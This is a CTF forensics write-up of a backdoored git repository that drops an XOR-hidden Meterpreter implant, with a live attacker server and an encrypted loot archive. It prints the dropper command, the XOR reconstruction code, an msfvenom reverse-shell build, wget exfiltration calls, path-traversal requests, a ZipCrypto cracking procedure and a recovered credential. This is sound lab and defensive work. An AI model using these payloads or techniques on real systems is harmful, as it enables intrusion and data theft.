---
type: writeup
title: "HTB Holmes 2026 — Poisoned Branch: Backdoored Internal Git Repo, XOR-Carried Mettle Implant, ZipCrypto Loot Recovery"
platform: Hack The Box
event: "Holmes CTF 2026: The Reichenbach Directive"
challenge: Poisoned Branch
category: forensics
subcategory: sherlock-dfir
difficulty: medium
points: 1000
status: complete
app: "PoisonedBranch.zip — Tom.zip (142 MB /home/Tom tree), uac_output/uac-LT-TAinsworth-linux-20260915155349.tar.gz (68 MB, UAC 3.3.0), Sherlock 05 PDF; plus a live attacker VM at 10.129.4.236:9999"
mitre:
  - T1195.001
  - T1204.002
  - T1027
  - T1140
  - T1059.004
  - T1571
  - T1105
  - T1098.004
  - T1083
  - T1005
  - T1560.001
  - T1041
  - T1070.004
  - T1070.003
  - T1587.001
tags:
  - writeup
  - HTB
  - Security
  - DFIR
  - Incident_Response
  - forensics
  - Linux
  - Network_Forensics
  - Malware_Analysis
  - Cryptography
  - Supply_Chain
related:
  - "[[HTB]]"
  - "[[HTB-Holmes2026-Silent-Dividend-Electron-Preload-Dropper-Onchain-Key-Oracle]]"
  - "[[HTB-Holmes2026-Bottle-Out-Wiped-Laptop-Gajim-XMPP-TacticalRMM]]"
  - "[[HTB-Holmes2026-Paper-Ghost-Planted-USB-Spyware-Search-Index-Recovery]]"
  - "[[HTB-Holmes2026-Iron-Feather-PX4-Encrypted-Dataman-ULog-Custom-KDF]]"
  - "[[HTB-Holmes2026-Borrowed-Name-AdaptixC2-RC4-Profile-Key-ResetNightmare]]"
aliases:
  - Poisoned Branch
  - Holmes 2026 Poisoned Branch
created: 2026-09-20T11:28:41.235Z
updated: 2026-09-20T11:28:41.235Z
---

# Poisoned Branch — Backdoored Internal Git Repo, XOR-Carried Mettle Implant, ZipCrypto Loot Recovery

> [!success] Solved — 2026-09-20 06:11 (platform clock) · 15 of 15 flags · **zero wrong submissions**
> **No `HTB{}` string exists for this room** — it is question-graded. Sherlock 05 of the event · medium · 1000 points.
> First room in the event with a clean submission record. Thirteen wrong submissions across the previous five rooms; none here.
> The room is two halves joined by one string. Ten flags come from a dead Linux triage collection; five come from a **live attacker web server** whose hostname is only recoverable from a hex-encoded `auditd` argument.

> [!info] Scenario, verbatim
> SCENARIO NAME
> 5 - Poisoned Branch
> The story will unfold through the PDFs provided with each challenge's downloadable ZIP.
>
> All characters, locations, and events are fictional. Any resemblance to real people, places, or events is purely coincidental.
>
> **Supplied artifact:** `PoisonedBranch.zip` → `Tom.zip`, `uac_output/` (log + tarball), `Holmes CTF 2026 - Sherlock 05 - Backdoored Repository and Exposed Server.pdf`. **Plus a spawned VM** at `10.129.4.236`, 23h52m timer, reachable over the HTB `US-CTF-1` OpenVPN pack. Flag 7's own text instructs the analyst to add the answer to `/etc/hosts`.

---

## Flags — Answers

| # | Question | Answer | Method |
|---|---|---|---|
| 1 | Name of the malicious repository | `diogenes-ticket-parser` | `.git/config` remote on `devforge.internal:3000`; only repo of five carrying a payload |
| 2 | Email listed for the author of the repo | `cbass.Moran@blackpearl2026.htb` | `git log --pretty=fuller` on commit `81d8e74` |
| 3 | File holding the encrypted payload | `calibration.bin` | `src/ticket_parser/calibration.bin`, 1,138,480 B; XOR key is the sibling JPEG |
| 4 | Full path of the C2 implant | `/home/Tom/.cache/.ticket-parser/.integrity` | audit EXECVE pid 1514; `ps_auxwwwf.txt` line 88 |
| 5 | Port the implant connected back to | `31337` | `ss -tanp`: `192.168.0.21:50878 → 203.0.113.10:31337`, `users:(( ".integrity",pid=1514,fd=4 ))` |
| 6 | PID of the implant | `1514` | same |
| 7 | URL:PORT tried before IP:PORT | `BlackPearl2026.htb:9999` | audit event 366, argument `a5`, **hex-encoded** |
| 8 | Cookie/Token for the attacker's web server | `X-Operator-Auth=napoleon_moran_1894` | audit event 366, argument `a2`, **hex-encoded** |
| 9 | Command that deleted a file before leaving | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` | audit event 381, pid 1551 |
| 10 | PPID of that command | `1549` | the `/bin/sh` the implant spawned at 15:40:33 |
| 11 | Command declaring the implant architecture while preparing the listener | `set payload linux/x64/meterpreter_reverse_tcp` | `/home/moran/.msf4/history`, pulled via path traversal |
| 12 | Command locating a specific directory and file combo | `search -d ONBOARDING -f *.pdf` | `/home/moran/.msf4/meterpreter_history` |
| 13 | File holding the exfiltrated documents | `LOOT.zip` | `/home/moran/Exfiltrated_Loot/LOOT.zip`, found by case-varied name fuzzing |
| 14 | Person with their position redacted | `Sarah Kemp` | roster row DIO-1648, Position column reads `REDACTED` |
| 15 | Address of that person | `Flat 6, Ashdown House, Palace Court, London W2 4LS` | same row, Home Address column |

All host timestamps are **UTC+1** (the collection's own `+0100`). The audit log stores epoch seconds; every time in this note is rendered in the host's local offset, matching the UAC acquisition banner.

---

## 0. How the flags were obtained

1. Unpacked the outer ZIP. Read the UAC banner first: **UAC 3.3.0, host `LT-TAinsworth`, x86_64, acquired 2026-09-15 15:53:50 → 15:55:59 +0100.**
2. Enumerated `Tom.zip` → `/home/Tom` with five repos under `Projects/`. Read all five `.git/config` remotes. Three are public GitHub clones; **two point at `http://devforge.internal:3000/diogenes/`.**
3. `git log --pretty=fuller --stat` on both internal repos. Only `diogenes-ticket-parser` ships a 1.1 MB binary blob and a `telemetry.py`. Flags 1 and 2.
4. Read the payload chain out of git rather than the working tree — **the working tree holds only `README.md` and `ticket_parser.py`; the entire `src/` package exists only in the pack file.**
5. `telemetry.py` XORs `diogenes.jpg` (33,892 B) as a repeating key over `calibration.bin` (1,138,480 B) and writes the result to `~/.cache/.ticket-parser/.integrity`. Reproduced it in Python; **MD5 `25b91344afc4d1ed01e2bd9d3c23e2cd`, byte-identical to the file on disk.** Flags 3 and 4.
6. Identified the reconstructed ELF as **Metasploit Mettle** from DWARF compile-unit paths. Confirmed the live socket in `live_response/network/ss_-tanp.txt`. Flags 5 and 6.
7. Found `auditd` configured with a single execve rule on uid 1000. Parsed `audit.log` into a pid/ppid-linked timeline — **including hex-decoding of arguments auditd refuses to store as quoted strings.** Flags 7, 8, 9, 10.
8. Connected the HTB VPN, mapped `10.129.4.236` to `BlackPearl2026.htb` in `/etc/hosts`, and authenticated to the operator's Flask file server with the recovered cookie.
9. Used the server's unguarded `/download?file=` path traversal to read `/home/moran/.msf4/history` and `.msf4/meterpreter_history`. Flags 11 and 12.
10. Read `/home/moran/Flask_server/app.py` through the same traversal. It names `UPLOAD_DIR = /home/moran/Exfiltrated_Loot` and provides **no listing route** for it. Located `LOOT.zip` by fuzzing case variants of the room's own vocabulary. Flag 13.
11. `LOOT.zip` uses **ZipCrypto**, and its `README.txt` member is byte-identical to a file already readable unencrypted in the same directory. Verified the match by CRC32, then recovered the internal keys with `bkcrack`'s known-plaintext attack. Flags 14 and 15.

---

## 1. Shape of the challenge

Three evidence sources, unequally weighted, and one of them is perishable.

| Source | Role |
|---|---|
| `Tom.zip` (`/home/Tom`) | supplies the **repository, the payload and the implant** — flags 1–6 |
| UAC `audit.log` | supplies **four flags and nothing else**, all four from two `wget` records and one `rm` — flags 7–10 |
| Live VM `10.129.4.236` | supplies **five flags**, none reachable offline — flags 11–15 |

The structural fact: **the room's pivot is a single hex string inside one audit record.** Flag 7's hostname and flag 8's cookie are the only two things that open the second half of the room, they sit in the same EXECVE event, and neither is visible to `grep`. Get that record wrong and ten flags is the ceiling.

Secondary structure, and the fifth instance of the event's dominant idea: **the operator encrypted the loot and left the known plaintext in the directory beside it.** See §3.3 in the MOC — but note this is a new variety. In Silent Dividend, Bottle Out, Paper Ghost, Iron Feather and Borrowed Name the unprotected sibling was a *key* or a *description*. Here it is a **known plaintext**, and the leak is cryptographic rather than informational.

---

## 2. The repositories

Five clones under `/home/Tom/Projects`. The local git identity on every one is `felamos <Tom@LT-TAinsworth.(none)>`.

| Repo | Remote | Verdict |
|---|---|---|
| `csvtomd` | `https://github.com/mplewis/csvtomd.git` | public, benign |
| `dlt` | `https://github.com/dlt-hub/dlt.git` | public, benign |
| `json-to-csv` | `https://github.com/vinay20045/json-to-csv.git` | public, benign |
| `diogenes-breakroom-roster` | `http://devforge.internal:3000/diogenes/diogenes-breakroom-roster.git` | **internal, benign** |
| `diogenes-ticket-parser` | `http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` | **internal, malicious** |

`devforge.internal:3000` is a self-hosted forge (port 3000 is the Gitea default). Both internal repos have exactly one commit, `Initial project import`, pushed eight minutes apart on 2026-09-11.

### 2.1 Flag 2's deliberate near-duplicate

The two internal repos carry **different author identities that differ only in spelling and case**:

| Repo | Author name | Author email |
|---|---|---|
| `diogenes-ticket-parser` (malicious) | Sebast**ai**n Moran | `cbass.Moran@blackpearl2026.htb` |
| `diogenes-breakroom-roster` (benign) | Sebast**ia**n Moran | `Cbass.Moran@blackpearl2026.htb` |

```
commit 81d8e7448c185be0733d8cab67b40a2e572fd91e
Author: Sebastain Moran <cbass.Moran@blackpearl2026.htb>
Date:   Fri Sep 11 16:05:06 2026 +0100

commit 12f40ad68a7587e67ada2a0b89c2681189db1ba0
Author: Sebastian Moran <Cbass.Moran@blackpearl2026.htb>
Date:   Fri Sep 11 15:58:56 2026 +0100
```

**The malicious repo's form is the lowercase one, and it is what graded.** Reading only one repo, or normalising the case, loses the flag. This is the event's §3.1 rule with a new mechanism: not a tool's rendering and not a punctuation quirk, but **a decoy artifact planted specifically so that the plausible answer is wrong**.

> [!tip] Generalisable
> When two artifacts in one collection answer the same question with near-identical strings, **the one that graded is the one attached to the malicious object**, and the difference between them is the point of the exercise rather than noise.

### 2.2 The payload is in the pack, not the working tree

`git ls-tree -r --long HEAD` on the malicious repo:

```
  6148  .DS_Store
   481  README.md
    23  requirements.txt
  6148  src/.DS_Store
    24  src/ticket_parser/__init__.py
1138480  src/ticket_parser/calibration.bin     md5 4fe6c76ddef401c4b7484d510faa59b4
 33892  src/ticket_parser/diogenes.jpg         md5 972244bf7361d50afe1c1fac708858f9
   703  src/ticket_parser/output_helpers.py
   148  src/ticket_parser/parser.py
  1621  src/ticket_parser/runtime_checks.py
   238  src/ticket_parser/setup.py
  1778  src/ticket_parser/telemetry.py
   909  ticket_parser.py
```

**The `src/` tree is not on disk.** `ls` on the working directory shows two files. Everything that matters is inside `pack-f5a3fc31c96303be6910cd081447412c93307e7b.pack` and only becomes visible through `git show HEAD:<path>` or `git checkout`.

Two `.DS_Store` files are present, which is an authoring artifact worth noting: the "attacker" built this repo on macOS.

---

## 3. The payload chain

### 3.1 The decoy layer

`ticket_parser.py` calls four functions before it does anything useful, three of which are deliberately broken:

```python
def main():
    try:
        build_2xreflect_profile()                                   # missing required arg
        input_data = inspect_double_black_header({"magic_pause":6}) # dict, not a path
        parser_profile = apply_not_running_away_defaults(parser_profile)  # NameError
    except:
        pass
    validate_environment()      # <- the payload
```

Every call in the `try` block raises. `build_2xreflect_profile` is missing its argument, `inspect_double_black_header` is handed a dict where it expects a path, and `apply_not_running_away_defaults` references `parser_profile` before assignment. The bare `except: pass` swallows all three. **`runtime_checks.py` and `output_helpers.py` are entirely benign and exist only to give those three names somewhere to resolve.**

The function names read as Sherlockian filler — "2x reflect", "double black header", "not running away". None of it is code that runs.

### 3.2 `telemetry.py` — the actual payload

```python
_CALIBRATION = (
    b"Y2htb2QgK3ggfi8uY2FjaGUvLnRpY2tldC1wYXJzZXIvLmludGVncml0eTsgfi8uY2FjaGUvLnRpY2tldC1wYXJzZXIvLmludGVncml0eSAyPiYxICY="
)
_CACHE_DIR  = b"LmNhY2hl"           # .cache
_PARSER_DIR = b"LnRpY2tldC1wYXJzZXI="  # .ticket-parser
_FILE       = b"LmludGVncml0eQ=="   # .integrity
```

`_CALIBRATION` decodes to:

```bash
chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &
```

`validate_environment()` XORs the two bundled resources with the shorter repeating over the longer, writes the result to the base64-assembled path, and shells out. There is no network fetch, no staging server, no second-stage download. **The implant ships inside the repository, XOR-encoded, and is assembled on first run.**

### 3.3 Reproducing it

```python
cal = open('calibration.bin','rb').read()   # 1,138,480 B
img = open('diogenes.jpg','rb').read()      #    33,892 B
longer, shorter = (cal, img) if len(cal) >= len(img) else (img, cal)
out = bytes(b ^ shorter[i % len(shorter)] for i, b in enumerate(longer))
# md5(out) == 25b91344afc4d1ed01e2bd9d3c23e2cd
```

Identical to `/home/Tom/.cache/.ticket-parser/.integrity` on disk. The operator's own build script, recovered later from the live server as `/home/moran/Tools/create_cal_bin.py`, is the same function in the same direction with `reverse.bin` in place of the output — **confirmation from both ends of the chain.**

> [!note] Why XOR against a JPEG
> The key is 33,892 bytes of JPEG, which is high-entropy and repeats 33.6 times across the payload. That defeats `strings`, `file` and any ELF-magic scan of the repository, and it is *not* cryptography — anyone with both files recovers the binary in three lines. The JPEG is a plausible package resource; the `.bin` is a plausible calibration blob. The disguise is the point, not the strength.

### 3.4 The implant is Mettle

`file` on the reconstruction:

```
ELF 64-bit LSB pie executable, x86-64, static-pie linked, with debug_info, not stripped
```

DWARF compile-unit paths identify it unambiguously:

```
/home/jenkins/agent/workspace/mettle_build_gem/mettle/mettle/src/main.c
/home/jenkins/agent/workspace/mettle_build_gem/mettle/mettle/src/c2.c
/home/jenkins/agent/workspace/mettle_build_gem/mettle/mettle/src/stdapi/net/client.c
...
```

Plus `c2_add_transport_uri`, `c2_egress_queue`, `c2_get_current_transport` in the symbol table, and statically linked libcurl and mbedTLS. **This is `linux/x64/meterpreter_reverse_tcp`** — the single-binary Mettle payload, not the staged variant.

That identification is what makes flag 11 answerable in the shape it wants: the question asks for a command that "declared the architecture", and once you know the implant is Mettle you are looking for msfconsole syntax rather than a netcat listener.

---

## 4. The audit log — the room's real gate

### 4.1 The rule

```
# live_response/system/auditctl_-l.txt
-a always,exit -F arch=b64 -S execve,execveat -F uid=1000 -F key=tom_exe
```

One rule, execve only, uid 1000 only. 189 EXECVE records. **This is the entire execution record for the room** — there is no shell history worth reading (`/home/Tom/.bash_history` is nine bytes: `dev/null\n`).

### 4.2 auditd hex-encodes arguments, and this is where the room hides

`grep wget audit.log` returns two records that look like this:

```
type=EXECVE msg=audit(1789482400.268:366): argc=6 a0="wget" a1="-q"
  a2=2D2D6865616465723D436F6F6B69653A20582D4F70657261746F722D417574683D6E61706F6C656F6E5F6D6F72616E5F31383934
  a3="-O" a4="authorized_keys"
  a5=687474703A2F2F426C61636B506561726C323032362E6874623A393939392F646F776E6C6F61643F66696C653D2E2E2F2E2E2F2E7373682F69645F7273612E7075620A6C73202D6C610A
```

**auditd stores any argument containing whitespace or special characters as an unquoted hex string.** A naive parser that only matches `a\d+="..."` reconstructs the command as `wget -q -O authorized_keys` — which reads as a syntactically invalid `wget` invocation with no URL, and hands you neither flag.

Decoded:

```
a2 = --header=Cookie: X-Operator-Auth=napoleon_moran_1894
a5 = http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub\nls -la\n
```

`a5`'s trailing `\nls -la\n` is a **paste artifact** — the operator pasted two lines into the implant's non-interactive `/bin/sh` at once, and the second line was consumed as part of the first argument. It is not part of the URL and must be stripped before submitting flag 7.

The parser used:

```python
def args(line):
    out = []
    for k, v in re.findall(r'\ba(\d+)=("(?:[^"\\]|\\.)*"|[0-9A-F]+)', line):
        out.append((int(k), v[1:-1] if v.startswith('"') else bytes.fromhex(v).decode('utf-8','replace')))
    return ' '.join(x[1] for x in sorted(out))
```

`ausearch -i` does this decoding natively and would have been the shorter route. Worth remembering when the log is on a host with the audit tooling installed.

### 4.3 Timeline — 2026-09-15, host local time (+0100)

| Time | Event | pid | ppid |
|---|---|---|---|
| 15:17:19 | `git clone --depth 1 https://github.com/mplewis/csvtomd.git` | 1454 | 770 |
| 15:19:03 | `git clone http://devforge.internal:3000/diogenes/diogenes-breakroom-roster.git` | 1475 | 770 |
| 15:19:20 | `python3 roster.py` (benign repo, runs clean) | 1491 | 770 |
| 15:19:59 | `git clone http://devforge.internal:3000/diogenes/diogenes-ticket-parser.git` | 1492 | 770 |
| **15:20:20** | **`python3 ticket_parser.py`** | 1511 | 770 |
| 15:20:21 | `/bin/sh -c chmod +x ~/.cache/…/.integrity; ~/.cache/…/.integrity 2>&1 &` | 1512 | 1511 |
| 15:20:21 | `chmod +x /home/Tom/.cache/.ticket-parser/.integrity` | 1513 | 1512 |
| **15:20:21** | **`/home/Tom/.cache/.ticket-parser/.integrity`** — implant, reparented to init | **1514** | **1** |
| 15:23:38 | `/bin/sh` — first operator shell | 1516 | 1514 |
| **15:26:40** | `wget … http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub` | 1520 | 1516 |
| 15:27:02 | `/bin/sh` | 1521 | 1514 |
| 15:33:08 | `/bin/sh` | 1525 | 1514 |
| **15:34:50** | `wget … http://203.0.113.10:9999/download?file=../../.ssh/id_rsa.pub` | 1528 | 1525 |
| 15:35:43 | `ls` / `ls -la` | 1529/1530 | 1525 |
| 15:36:47 | `git clone --depth 1 https://github.com/vinay20045/json-to-csv.git` (Tom, unaware) | 1531 | 770 |
| 15:40:33 | `/bin/sh` | **1549** | 1514 |
| 15:40:35 | `ls` | 1550 | 1549 |
| **15:40:57** | **`rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf`** | **1551** | 1549 |
| 15:40:59 | `ls -la` | 1552 | 1549 |
| 15:45:40 | `su` | 1557 | 770 |
| 15:53:50 | UAC acquisition begins | — | — |

Three details in that table carry flags.

**The implant's ppid is 1.** `/bin/sh -c "... &"` backgrounds the binary, the intermediate shell exits, and the kernel reparents it to init. That is why `ps_auxwwwf.txt` shows `.integrity` at the top level rather than under `python3`, and it is a general Linux-triage point: **a backgrounded payload loses its parent within milliseconds, so process-tree position is not evidence of origin.**

**Each operator shell is a separate `/bin/sh` child of 1514.** The Meterpreter `shell` command spawns a new one per invocation; there were four (1516, 1521, 1525, 1549). Flag 10's answer is `1549` — the shell live at 15:40:57 — not the implant.

**The hostname attempt precedes the IP attempt by eight minutes.** `BlackPearl2026.htb` never resolved from Tom's host, so the operator fell back to the literal address. That failure is the room's key: had DNS worked, the hostname might never have appeared in the log at all.

### 4.4 Noise planted in `~/.cache`

The audit log also shows Tom manually creating a set of plausible cache directories on 2026-09-13, two days before the compromise:

```
mkdir .cache · mkdir pip · mkdir git · mkdir .dconf · touch shader · mkdir .virt · touch .virt/sys
```

`~/.cache/pip/`, `~/.cache/git/`, `~/.cache/.dconf/shader`, `~/.cache/.virt/sys` are all empty. They exist so that `~/.cache/.ticket-parser/` does not stand out in a directory listing. **The camouflage is in the collection, not just in the payload** — and it is visible as camouflage precisely because auditd recorded it being built.

---

## 5. The live server

### 5.1 Getting on it

The HTB pack is certificate-only — no username or password, keys embedded:

```
client / dev tun / proto udp
remote edge-us-ctf-1-dhcp.hackthebox.eu 1337
comp-lzo  (removed in OpenVPN 2.6 — comment it out if the client aborts)
tls-cipher "DEFAULT:@SECLEVEL=0"
```

```bash
sudo openvpn Holmes-CTF-2026_-The-Reichenbach-Directive-US-CTF-1.ovpn
echo "10.129.4.236 BlackPearl2026.htb" | sudo tee -a /etc/hosts
export C='Cookie: X-Operator-Auth=napoleon_moran_1894'
export B='http://BlackPearl2026.htb:9999/download?file='
```

### 5.2 `app.py` — the vulnerability, in full

Recovered through its own bug:

```python
COOKIE_NAME  = "X-Operator-Auth"
COOKIE_VALUE = "napoleon_moran_1894"

MORAN_HOME  = Path("/home/moran")
PUBLIC_DIR  = MORAN_HOME / "Flask_server" / "public"
UPLOAD_DIR  = MORAN_HOME / "Exfiltrated_Loot"     # "Uploaded/exfiltrated data lands here."
TOOLS_DIR   = MORAN_HOME / "Tools"

@app.get("/download")
def download():
    requested_file = request.args.get("file", "")
    if not requested_file:
        return dead_end()
    target_file = PUBLIC_DIR / requested_file      # <-- no normalisation, no containment check
    if not target_file.is_file():
        return dead_end()
    return send_file(target_file, as_attachment=True, download_name=target_file.name)
```

Two distinct flaws:

1. **`pathlib` absolute-path absorption.** `Path("/a/b") / "/etc/passwd"` is `/etc/passwd`, not `/a/b/etc/passwd`. Absolute paths work directly; `../../` also works because nothing resolves or compares against a root.
2. **No exception handling around `send_file`.** A path that exists but is unreadable by `moran` raises and Flask returns its stock **500** page.

That second flaw is a **file-existence oracle**, and it is more useful than it looks:

| Response | Meaning |
|---|---|
| 200 | file exists and is readable |
| **500** | **file exists, `moran` cannot read it** |
| 404 | does not exist — **or is a directory** (`is_file()` is False either way) |

`/root/.bash_history` returned 500. Directories return 404 indistinguishably from nonexistent paths, which is why no amount of probing can confirm a subdirectory.

The author was careful everywhere else: `@app.before_request` gates every route on the cookie, `dead_end()` returns an identical 404 for 400/403/404/405, and `/upload` runs `secure_filename()`. **The traversal is the intended way in.**

### 5.3 What the traversal yielded

```bash
curl -s -H "$C" "${B}/home/moran/.bash_history"
```

```
cat /dev/null > ~/.bash_history
cat .bash_history
ls -la /root/
ls -la
sudo shutdown -h now
ls
rm -rf toss/
ls Tools/   ls repos/   ls Flask_server/
ss -ant
sudo nano /etc/systemd/system/blackpearl-flask.service
sudo systemctl daemon-reload
sudo systemctl enable --now blackpearl-flask.service
nano Flask_server/app.py
sudo shutdown -h now
exit
```

The operator wiped their own history at session start; **the surviving lines are everything after the wipe**, which is the Flask deployment and nothing about the intrusion. It does, however, name the directory layout — `Tools/`, `repos/`, `Flask_server/`, and a deleted `toss/`.

`/etc/systemd/system/blackpearl-flask.service` confirms `User=moran`, `WorkingDirectory=/home/moran/Flask_server`, and contains a typo (`After=netowrk-online.target`) that silently disables the ordering dependency.

### 5.4 Flags 11 and 12 — two separate history files

This is the one place the room can cost you a detour. **msfconsole and Meterpreter keep separate readline histories**:

`/home/moran/.msf4/history` — the console prompt:

```
exit
use exploit/multi/handler
set lport 31337
set lhost blackpearl2026.htb
set payload linux/x64/meterpreter_reverse_tcp
run
```

`/home/moran/.msf4/meterpreter_history` — the session prompt:

```
getuid / help / sysinfo / pwd
cd ../../ / ls -la / cd .ssh / ls -la / shell / ls / shell
search -h
search -d ONBOARDING
search -d ONBOARDING -f *.pdf
search -f *.pdf
pwd / cd ../ONBOARDING / ls / cd .. / ls / cd Work_Stuff/ / ls / cd ONBOARDING/ / ls
download -h
download Gov_HR_Continuity_Emergency_Callout_Roster.pdf
shell
bg
```

**Flag 11 is in the first file.** The question says "while preparing the listener", which selects the msfconsole block. `set payload linux/x64/meterpreter_reverse_tcp` is the only line in it carrying an architecture — `use exploit/multi/handler`, `set lport`, `set lhost` and `run` carry none. `/home/moran/Tools/create_backdoor.sh` also declares `x64`:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=blackpearl2026.htb LPORT=31337 -f elf -o reverse.bin
```

— but that **builds** the implant, it does not prepare the listener. The question's wording is the discriminator between two true answers.

**Flag 12 is in the second file, and it is bracketed by its own failures.** Three `search` invocations in sequence; only the middle one gives both a directory and a file pattern. `framework.log` corroborates:

```
15:37:59  meterpreter: stdapi_fs_search: Operation failed: 13     # EACCES — the bare -f *.pdf
15:38:41  meterpreter: stdapi_fs_chdir: Operation failed: 2       # ENOENT — cd ../ONBOARDING
```

The two errors are the two `search`/`cd` attempts that did not work, which leaves `search -d ONBOARDING -f *.pdf` as the one that did. **The operator's mistakes disambiguate the answer.**

### 5.5 `/home/moran/Tools` — the whole build chain

```json
{"tools": ["calibration.bin", "create_backdoor.sh", "create_cal_bin.py",
           "diogenes.jpg", "git_payload_gen.sh", "reverse.bin"]}
```

`git_payload_gen.sh` is one line:

```bash
echo -n 'chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &' | base64
```

`create_cal_bin.py` is `telemetry.py`'s `repeating()` function verbatim, run in the other direction. The operator's toolkit and the victim's repository are the same three files, and the server hands over both halves.

---

## 6. LOOT.zip

### 6.1 Finding it

`app.py` names `UPLOAD_DIR` but provides no listing route — `/tools` enumerates `TOOLS_DIR` only. `Exfiltrated_Loot/` is a directory, so it returns 404 like any nonexistent path. **The archive has to be guessed by name.**

Two failed approaches, recorded because each cost real time:

- **`raft-small-files.txt` and `raft-medium-files.txt`, ~68k requests, one hit.** These are web-content wordlists — `README.txt`, `index.html`, `config.php`. They contain essentially no operator-chosen document names. The one hit was `README.txt`, the only web-shaped filename in the directory.
- **A hand-built candidate list run at inconsistent case.** `loot.zip` and `Loot.zip` were tried; `LOOT.zip` was not.

What worked was the room's own vocabulary with **every case variant of each token**:

```bash
printf '%s\n' Loot loot LOOT Exfil exfil Exfiltrated Package package \
  Diogenes diogenes DIOGENES Napoleon napoleon NAPOLEON ... > /tmp/z.txt

ffuf -u "http://BlackPearl2026.htb:9999/download?file=/home/moran/Exfiltrated_Loot/FUZZ" \
  -H "$C" -w /tmp/z.txt -e .zip,.7z,.tar.gz,.rar -mc 200,500 -s
→ LOOT.zip
```

### 6.2 The README is the crack

`Exfiltrated_Loot/README.txt`, 83 bytes, readable unencrypted:

```
Upon exfiltration of loot. Package into a password protected zip. Remove remnants.
```

The **same file is a member of the encrypted archive**. `bkcrack -L` shows why that matters:

```
Index Encryption Compression CRC32    Uncompressed  Packed size Name
    0 ZipCrypto  Store       8566f27e           41           53  cvoss_exfil
    1 ZipCrypto  Deflate     90c8d645        78587        38205  Gov_HR_…_Roster.pdf
    2 ZipCrypto  Deflate     e4d5acac           83           88  README.txt
```

**ZipCrypto, not AES.** Biham–Kocher known-plaintext recovers the three internal keys regardless of password strength — and the password is irrelevant afterwards.

Two arithmetic checks done *before* launching the attack, both of which cost one command and removed all guesswork:

1. **`cmplen` includes ZipCrypto's 12-byte header.** 88 − 12 = **76**, and 83 bytes of that English text deflates to exactly 76 at every level 1–9. The stored entry checks too: 53 − 12 = 41 = uncompressed. So compression-level matching was a non-issue.
2. **CRC32 of the reconstructed plaintext is `E4D5ACAC`** — bit-for-bit the value in the zip's central directory. The plaintext was proven exact before a single cycle was spent.

```bash
printf 'Upon exfiltration of loot. Package into a password protected zip. Remove remnants.\n' > README.txt
zip -q plain.zip README.txt
bkcrack -C LOOT.zip -c README.txt -P plain.zip -p README.txt
```

```
[06:42:43] Z reduction using 69 bytes of known plaintext
[06:42:43] Attack on 120564 Z values at index 6
Keys: 85b6bbc1 27824945 ce665bee
84.1 % (101451 / 120564)
Found a solution. Stopping.
```

Ten minutes, single-threaded. `rockyou.txt` had already failed at 259k candidates/sec — **the password is not a common one, and never needed to be recovered.** It was later attempted anyway and is out of reach; see §17.3.

```bash
bkcrack -C LOOT.zip -k 85b6bbc1 27824945 ce665bee -D decrypted.zip
unzip decrypted.zip -d out
```

`bkcrack` is **not in Kali's repositories**. Take the static release binary:
`https://github.com/kimci86/bkcrack/releases/download/v1.7.1/bkcrack-1.7.1-Linux.tar.gz`

### 6.3 Contents

| File | Size | md5 |
|---|---|---|
| `Gov_HR_Continuity_Emergency_Callout_Roster.pdf` | 78,587 | `bf105a764e12dd67dbfe55bf083dea1a` |
| `README.txt` | 83 | `15bc6045aafc81084a34a729a0e3f9a3` |
| `cvoss_exfil` | 41 | `1d8bd4d2b91d35896af80c1bc87c897d` |

`cvoss_exfil`:

```
tainsworth:d10g3n3s_T1ck3ts#2026:forever
```

---

## 7. The roster — flags 14 and 15

PDF metadata:

```
Title    : DIOGENES HR Continuity Emergency Call-Out Roster
Author   : Tom Ainsworth
Subject  : Emergency Call-Out Directory Export
Producer : LibreOffice 25.2.3.2 (X86_64)
Created  : 2026-09-11 19:34:35Z
Export   : HRC-UAT-260817-04 · 17 August 2026 16:42 BST · Tom Ainsworth | EXT-0419 · HRC 2.8.4-rc3
```

Ten rows, `London Response Group`. Nine carry a Position; **one reads `REDACTED`**:

| Employee ID | Name | User ID | Directorate | Position | Handling |
|---|---|---|---|---|---|
| DIO-0734 | Richard Fairfax | rfairfax | Identity and Trust | Head of Identity and Trust Services | RESTRICTED |
| DIO-1021 | Eleanor Shaw | eshaw | Identity Operations | Identity Operations Manager | INTERNAL |
| DIO-1187 | Martin Keane | mkeane | Infrastructure Engineering | Infrastructure Engineer | INTERNAL |
| DIO-1312 | Rebecca Holt | rholt | Security Operations | Security Operations Analyst | INTERNAL |
| DIO-1455 | Daniel Kerr | dkerr | PKI Engineering | PKI Engineer | INTERNAL |
| DIO-1524 | James Whitlock | jwhitlock | Systems Engineering | Systems Engineer | INTERNAL |
| **DIO-1648** | **Sarah Kemp** | **skemp** | **Identity Operations** | **REDACTED** | **CONFIDENTIAL** |
| DIO-1719 | Alice Fenwick | afenwick | Fusion Analysis | Senior Fusion Analyst | INTERNAL |
| DIO-1791 | Jonathan Reed | jreed | Platform Engineering | Platform Engineer | RESTRICTED |
| DIO-1840 | Marcus Hale | mhale | Data Integration | Data Integration Engineer | INTERNAL |

**Sarah Kemp** is the only `CONFIDENTIAL` row, and the only address that is a flat rather than a street number:

```
Flat 6, Ashdown House, Palace Court, London W2 4LS
```

Every other address follows `<number> <street>, London <postcode>`. Hers is the outlier in three independent columns at once — position, handling marking, and address format.

> [!note] Two names in this table appear in Borrowed Name
> `afenwick` (Alice Fenwick) is the account whose NetNTLMv2 was captured via `internal_monologue` in Sherlock 08, and `jreed` (Jonathan Reed) is the account whose password was reset via CVE-2026-27912. **This roster is the target list that Sherlock 08's operator was working from.** Both appear here with their real directorates, and Fenwick's `Senior Fusion Analyst` title matches nothing stated in that room.

---

## 8. Cross-room links

**`cvoss_exfil` is the hardest evidence-level join in the event so far.**

| Room | Artifact | String |
|---|---|---|
| Paper Ghost (04) | exfiltrated target list from Clara Voss's workstation | `tainsworth:D10g3n3s_T1ck3ts#2026` for `srv-diogenes-tickets-01.internal` |
| Poisoned Branch (05) | `cvoss_exfil` inside `LOOT.zip` | `tainsworth:d10g3n3s_T1ck3ts#2026:forever` |

